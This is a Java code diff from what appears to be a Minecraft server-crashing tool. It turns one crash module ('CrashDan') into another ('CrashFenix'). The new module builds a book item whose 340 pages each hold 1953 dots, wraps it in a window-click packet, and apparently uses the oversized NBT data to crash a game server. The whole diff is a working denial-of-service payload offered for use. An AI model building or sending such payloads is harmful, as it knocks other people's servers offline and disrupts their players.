@@ -1,6 +1,5 @@
 package pl.venixpll.system.crash.impl;
 
-import lombok.SneakyThrows;
 import net.minecraft.nbt.NBTBase;
 import net.minecraft.nbt.NBTTagCompound;
 import net.minecraft.nbt.NBTTagList;
@@ -14,34 +13,40 @@ import pl.venixpll.system.crash.Crash;
 import pl.venixpll.system.crash.CrashType;
 
 import java.util.List;
+import java.util.concurrent.atomic.AtomicReference;
 import java.util.stream.Collectors;
 import java.util.stream.IntStream;
 
-public class CrashDan extends Crash {
-    public CrashDan() {
-        super("dan",CrashType.NBT);
+public class CrashFenix extends Crash {
+    public CrashFenix() {
+        super("fenix",CrashType.NBT);
     }
 
     private Packet packet;
 
-    @SneakyThrows
     @Override
     public void init() {
 
+        final AtomicReference<String> pageContent = new AtomicReference<>();
+        pageContent.set("");
+
+        IntStream.range(0,1953).forEach(i -> pageContent.set(pageContent.get() + "."));
+
         final NBTTagCompound compound = new NBTTagCompound();
 
-        final List<NBTBase> list = IntStream.range(0, 2500)
-                .mapToObj(ia -> new NBTTagString("-_-_-_-"))
+        final List<NBTBase> list = IntStream.range(0, 340)
+                .mapToObj(ia -> new NBTTagString(pageContent.get()))
                 .collect(Collectors.toList());
 
         final NBTTagList pages = new NBTTagList();
         list.forEach(pages::appendTag);
 
         compound.setTag("pages",pages);
+        compound.setTag("title",new NBTTagString("8kBolTfSMpV2yJ"));
+        compound.setTag("author",new NBTTagString("Tadeq05177"));
 
-        final ItemStack stack = new ItemStack(138, 1, 0, compound);
-
-        this.packet = new ClientPlayerWindowActionPacket(0,(short)1,0, WindowAction.CLICK_ITEM,1,stack);
+        final ItemStack itemStack = new ItemStack(386, 1, 0, compound);
+        this.packet = new ClientPlayerWindowActionPacket(0,(short)20,0, WindowAction.CLICK_ITEM,0,itemStack);
     }
 
     @Override
